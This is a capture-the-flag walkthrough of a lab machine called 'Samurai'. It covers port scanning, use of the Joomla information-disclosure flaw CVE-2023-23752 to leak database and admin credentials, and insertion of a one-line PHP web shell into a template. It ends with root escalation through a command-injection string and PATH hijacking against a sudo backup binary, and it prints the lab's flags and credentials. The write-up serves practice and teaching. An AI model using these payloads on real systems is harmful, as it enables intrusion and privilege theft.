+++
title = "Samurai - Walkthrough"
date = "2026-07-26"
author = "nvru"
description = "Walkthrough for the Samurai machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "apache",
  "joomla",
  "cve-2023-23752",
  "command-injection",
  "privilege-escalation",
  "easy"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.200.74.40`
- **Target Machine IP:** `10.1.22.42`

The objective was to enumerate the target, identify exposed services, gain initial access by exploiting a vulnerable Joomla installation (CVE-2023-23752), and escalate privileges by abusing a vulnerable backup binary that could be executed as root.

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.1.22.42 -- -sC -sV -A -oN nmap/rust
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.52 (Ubuntu)
```

Only two services were exposed:

- SSH on port **22**
- Apache HTTP Server on port **80**

Since SSH generally requires valid credentials, the web service became the primary attack surface.

---

## Enumeration

### HTTP Enumeration

Browsing to the web server displayed a simple page about Samurai swords.

![HTTP](/images/hsm/samurai/http.png)

Checking the page source did not reveal anything interesting, so I continued with automated enumeration.

---

### Nikto

```bash
nikto -h http://10.1.22.42/
```

Nikto reported a few missing security headers and that the Apache version appeared outdated, but nothing immediately exploitable.

The scan did not reveal hidden files or vulnerable CGI scripts, so I proceeded with directory enumeration.

---

### Directory Enumeration

Using a directory brute-force tool revealed two interesting files:

- `LICENSE.txt`
- `README.txt`

![Directory Enumeration](/images/hsm/samurai/dir_brute.png)

Opening the files showed they belonged to a Joomla installation.

![License](/images/hsm/samurai/license.png)

![README](/images/hsm/samurai/readme.png)

The README identified the CMS as **Joomla 4.2.x**.

![Joomla Version](/images/hsm/samurai/joomla_version.png)

---

### CVE-2023-23752

After identifying the Joomla version, I searched for known vulnerabilities affecting it.

I found **CVE-2023-23752**, an unauthenticated information disclosure vulnerability affecting Joomla 4.0.0 through 4.2.7.

Reference:

- https://www.exploit-db.com/exploits/51334

Running the exploit successfully leaked sensitive configuration data.

![Exploit](/images/hsm/samurai/exploit.png)

The response exposed the database configuration:

```text
DB type: mysqli
DB host: localhost
DB user: joomla425
DB password: Pa847word987@Joomla456
DB name: Dbjoomla
DB prefix: iemj4_
```

It also revealed the Joomla administrator username:

```text
Miyamoto
```

---

### Administrator Login

During directory enumeration I had also discovered the administrator panel.

```
http://10.1.22.42/administrator
```

The login page was accessible.

![Login Page](/images/hsm/samurai/login_page.png)

Using the leaked credentials successfully authenticated to the Joomla administrator dashboard.

```text
Username: Miyamoto
Password: Pa847word987@Joomla456
```

---

## Initial Access

With administrator access, uploading a web shell was straightforward.

Navigate to:

```
System
    → Site Templates
```

![System](/images/hsm/samurai/system.png)

![Site Templates](/images/hsm/samurai/site_templates.png)

Only one template was present.

![Template](/images/hsm/samurai/template.png)

Instead of modifying `index.php`, I edited another template file to avoid breaking the main page.

The following PHP payload was inserted:

```php
<?=`$_GET[0]`?>
```

![Template Source](/images/hsm/samurai/template_src.png)

After saving the template, arbitrary commands could be executed through the browser.

![id www-data](/images/hsm/samurai/id_suc.png)

Using the web shell, I spawned a reverse shell.

![Reverse Shell](/images/hsm/samurai/rev_shell.png)

Once connected, I upgraded the shell.

```bash
script -q /dev/null
bash -i
```

Background the shell:

```text
CTRL + Z
```

Then fix the terminal:

```bash
stty raw -echo; fg
```

Press **Enter** twice.

---

## Privilege Escalation

### www-data → root

The first thing I checked was the sudo permissions.

```bash
sudo -l
```

![Sudo Permissions](/images/hsm/samurai/sudo_perm.png)

The output showed that `www-data` could execute the following binary as root without supplying a password.

```text
/opt/backup/DbMaria
```

The binary itself had the SUID bit set.

![File Permissions](/images/hsm/samurai/file_perm.png)

Checking its properties showed that it was **not stripped**, making it easier to inspect.

![Not Stripped](/images/hsm/samurai/not_stripped.png)

Running `strings` against the binary revealed several interesting functions, including `setuid()` and `system()`.

![Strings](/images/hsm/samurai/strings.png)

Among the extracted strings was the command executed by the program:

```text
mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s > /tmp/backup.sql
```

Notice that the database name supplied by the user is inserted directly into the command without sanitization.

This makes the binary vulnerable to **command injection**.

---

### Command Injection

Inspecting the binary with `strings` revealed the following command:

```text
mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s > /tmp/backup.sql
```

The database name provided by the user is inserted directly into the command without any sanitization before being passed to `system()`. This makes the binary vulnerable to command injection.

There are two different ways to abuse this binary.

#### Method 1 - Injecting Commands

The easiest method is to inject a command into the database name. Since the input is passed directly to the shell, a semicolon (`;`) can be used to terminate the original `mariadb-dump` command and execute a new one.

For example:

```bash
sudo /opt/backup/DbMaria ';bash -i'
```

or

```bash
sudo /opt/backup/DbMaria ';bash -i;'
```

The database dump will fail, but the injected `bash -i` command is executed as **root**, giving an interactive root shell.

There is actually no need for the trailing semicolon after `bash -i`; I simply used it out of habit. The exploit works either way.

![First Sudo Method](/images/hsm/samurai/sudo_first.png)

---

#### Method 2 - PATH Hijacking

Another interesting observation is that the binary executes `mariadb-dump` without using its absolute path.

Because of that, it is possible to hijack the `PATH` variable and force the binary to execute our own malicious program instead.

First, create a fake `mariadb-dump` executable.

```bash
echo 'bash -i' > /tmp/mariadb-dump
chmod +x /tmp/mariadb-dump
```

Then prepend `/tmp` to the `PATH`.

```bash
export PATH=/tmp:$PATH
```

Finally, execute the binary.

```bash
/opt/backup/DbMaria nvru
```

![Second Sudo Method](/images/hsm/samurai/second_way.png)

This successfully spawns a root shell. If the shell appears without any output, simply restore standard output by running:

```bash
exec 1>/dev/tty
```

![Second Fix](/images/hsm/samurai/second_fix.png)

One interesting thing I noticed while testing is that this second method only works when executing the binary directly.

Initially, I focused on this binary because `sudo -l` allowed me to run it as root. However, if the binary is executed with `sudo`, this technique fails because `sudo` resets the environment and uses its own secure `PATH`. As a result, the fake `mariadb-dump` in `/tmp` is never executed.

![Second Sudo Method](/images/hsm/samurai/sudo_secon.png)

The first method, however, works perfectly with `sudo` because it doesn't rely on the environment at all. Instead, it abuses the application's unsanitized input, causing `system()` to execute the injected command directly as root.

---

## User Flag

To locate the user flag, I searched the filesystem.

```bash
find / -type f -name user.txt 2>/dev/null
```

![User Flag](/images/hsm/samurai/found_user_flag.png)

---

## Credentials

```text
Miyamoto:Pa847word987@Joomla456

DB User: joomla425
DB Password: Pa847word987@Joomla456
```

---

## Flags

```text
user:flag{Tachi_794–1185}

root:flag{Katana_1603–1868}
```
